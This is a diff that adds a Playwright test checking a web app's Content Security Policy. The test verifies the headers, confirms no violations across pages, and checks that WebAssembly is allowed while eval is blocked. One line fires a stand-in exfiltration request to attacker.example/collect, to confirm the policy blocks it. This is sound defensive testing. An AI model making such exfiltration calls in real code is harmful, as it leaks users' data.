@@ -91,3 +91,40 @@ test("switches language and reads the docs", async ({ page }) => {
   await page.goto("/onboard");
   await expect(page).toHaveURL(/\/en\/onboard$/);
 });
+
+test("the CSP lets the app and the SDK's WebAssembly run, and nothing else", async ({ page }) => {
+  const violations: string[] = [];
+  page.on("console", (msg) => {
+    if (msg.type() === "error" && /Content Security Policy/i.test(msg.text())) violations.push(msg.text());
+  });
+
+  const response = await page.goto("/en");
+  const policy = response?.headers()["content-security-policy"] ?? "";
+  expect(policy).toContain("frame-ancestors 'none'");
+  expect(policy).toContain(`connect-src 'self' ${API}`);
+  for (const path of ["/en/onboard", "/en/deposit", "/en/wallet", "/en/audit", "/en/docs"]) {
+    await page.goto(path);
+    await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
+  }
+  expect(violations).toEqual([]);
+
+  const checks = await page.evaluate(async () => {
+    // The smallest valid module: what the SDK needs is that compiling is allowed.
+    const wasm = await WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(
+      () => "allowed",
+      () => "blocked",
+    );
+    let evaluated = "allowed";
+    try {
+      eval("1");
+    } catch {
+      evaluated = "blocked";
+    }
+    const exfiltration = await fetch("https://attacker.example/collect").then(
+      () => "allowed",
+      () => "blocked",
+    );
+    return { wasm, evaluated, exfiltration };
+  });
+  expect(checks).toEqual({ wasm: "allowed", evaluated: "blocked", exfiltration: "blocked" });
+});
